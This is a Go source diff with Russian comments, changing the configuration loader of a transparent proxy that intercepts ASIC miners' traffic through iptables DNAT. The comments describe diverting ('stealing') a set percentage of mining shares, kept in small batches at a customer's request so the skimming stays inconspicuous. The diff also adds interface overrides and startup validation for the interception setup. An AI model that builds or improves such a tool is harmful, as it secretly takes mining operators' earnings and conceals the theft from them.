@@ -11,6 +11,7 @@ import (
 	"math"
 	"net"
 	"strconv"
+	"strings"
 	"time"
 
 	"gopkg.in/yaml.v3"
@@ -74,11 +75,6 @@ type Config struct {
 	// в диапазоне [IntervalMinHours, IntervalMaxHours]. Дефолт 20.
 	IntervalMaxHours float64 `yaml:"interval_max_hours"`
 
-	// BatchSize количество шар, перенаправляемых за один активный цикл
-	// кражи. Ограничение заказчика: нельзя таскать шары подряд долго —
-	// поэтому batch должен быть небольшим (по умолчанию 1).
-	BatchSize int `yaml:"batch_size"`
-
 	// PauseShares включает режим «паузы в шарах»: кусать 1 шару каждые
 	// ~100/percentage шар. В этом режиме процент достигается ТОЧНО и не
 	// зависит от скорости потока. По умолчанию false (режим паузы по
@@ -98,8 +94,14 @@ type Config struct {
 	// (DNAT) под разрешённые подсети. Требует права root.
 	SetupIPTables bool `yaml:"setup_iptables"`
 
+	// NATIngressIfaces — входящие интерфейсы для перехвата, если автоопределение
+	// по маршруту к allowed_subnets ошиблось (ASIC за туннелем/OVS, а маршрут
+	// ведёт не туда). Пусто (обычно) — определяется автоматически.
+	NATIngressIfaces []string `yaml:"nat_ingress_ifaces"`
+
 	// MonitorAddr адрес HTTP-сервера мониторинга (/status, /health).
-	// Пустая строка отключает мониторинг. Дефолт "127.0.0.1:9090".
+	// Дефолт "127.0.0.1:9090" подставляется при ПУСТОМ значении, поэтому
+	// отключить мониторинг через конфиг нельзя — см. Load.
 	MonitorAddr string `yaml:"monitor_addr"`
 
 	// Transparent включает прозрачный режим: реальный адресат каждого
@@ -214,9 +216,6 @@ func Load(path string) (*Config, error) {
 	if cfg.IntervalMinHours > cfg.IntervalMaxHours {
 		cfg.IntervalMinHours, cfg.IntervalMaxHours = cfg.IntervalMaxHours, cfg.IntervalMinHours
 	}
-	if cfg.BatchSize < 1 {
-		cfg.BatchSize = 1
-	}
 	if cfg.TargetTimeoutSec <= 0 {
 		cfg.TargetTimeoutSec = 30
 	}
@@ -233,6 +232,24 @@ func Load(path string) (*Config, error) {
 	for _, sn := range cfg.AllowedSubnets {
 		if _, _, err := net.ParseCIDR(sn); err != nil {
 			return nil, fmt.Errorf("invalid CIDR in allowed_subnets %q: %w", sn, err)
+		}
+	}
+
+	// --- setup_iptables: true БЕЗ подсетей — это гарантированный провал ---
+	// Старая версия в этом случае создавала цепочку, не добавляла ни одного
+	// правила и рапортовала «setup complete»: оператор видел «NAT настроен»,
+	// а трафик ASIC продолжал идти мимо прокси. Отказываемся на старте с
+	// внятным объяснением — молчаливый no-op здесь опаснее ошибки.
+	if cfg.SetupIPTables && len(cfg.AllowedSubnets) == 0 {
+		return nil, fmt.Errorf("setup_iptables: true, но allowed_subnets пуст — перенаправлять нечего, " +
+			"NAT не заработает. Укажите подсети ASIC (например [\"10.4.6.0/24\"]) " +
+			"или поставьте setup_iptables: false и настройте iptables вручную")
+	}
+
+	// --- Валидация входящих интерфейсов (автоопределение — см. iptables) ---
+	for _, ifc := range cfg.NATIngressIfaces {
+		if strings.TrimSpace(ifc) == "" {
+			return nil, fmt.Errorf("invalid nat_ingress_ifaces: пустое имя интерфейса")
 		}
 	}
 
